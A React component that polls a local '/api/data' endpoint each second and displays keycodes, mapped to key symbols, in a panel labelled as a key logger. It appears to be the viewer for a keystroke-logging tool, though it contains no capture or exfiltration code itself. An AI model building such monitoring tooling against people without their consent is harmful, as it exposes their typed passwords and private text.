import { useEffect, useState } from 'react';

export default function View() {
  const [data, setData] = useState([]);

  useEffect(() => {
    const fetchKeys = async () => {
      try {
        const res = await fetch("/api/data");
        const json = await res.json();
        if (Array.isArray(json)) {
          setData(json);
        } else {
          console.error("Unexpected API response:", json);
        }
      } catch (err) {
        console.error("Fetch error:", err);
      }
    };

    fetchKeys();
    const interval = setInterval(fetchKeys, 1000);
    return () => clearInterval(interval);
  }, []);

  const decodeKey = (code) => {
    // Enhanced keycode mapping
    const keyMap = {
      8: '⌫',   // Backspace
      9: '⇥',    // Tab
      13: '↵',   // Enter
      16: '⇧',   // Shift
      17: '⌃',   // Ctrl
      18: '⌥',   // Alt
      19: '⎉',   // Pause/Break
      20: '⇪',   // Caps Lock
      27: '⎋',   // Escape
      32: '␣',   // Space
      33: '⇞',   // Page Up
      34: '⇟',   // Page Down
      35: '↘',   // End
      36: '↖',   // Home
      37: '←',   // Arrow Left
      38: '↑',   // Arrow Up
      39: '→',   // Arrow Right
      40: '↓',   // Arrow Down
      45: '⎀',   // Insert
      46: '⌦',   // Delete
      91: '⊞',   // Windows/Command
      93: '≣',   // Menu
      112: 'F1', // Function keys...
      113: 'F2',
      // Add more F-keys as needed
    };

    // Check if it's a printable character
    if (code >= 33 && code <= 126 && !keyMap[code]) {
      return String.fromCharCode(code);
    }
    
    return keyMap[code] || `[${code}]`;
  };

  return (
    <div className="key-logger-box">
  {data.length > 0 ? (
    data.map((code, index) => (
      <span key={index} className="key">
        {decodeKey(code)}
      </span>
    ))
  ) : (
    <span style={{ color: "#888" }}>No keys logged yet...</span>
  )}
</div>
  );
}
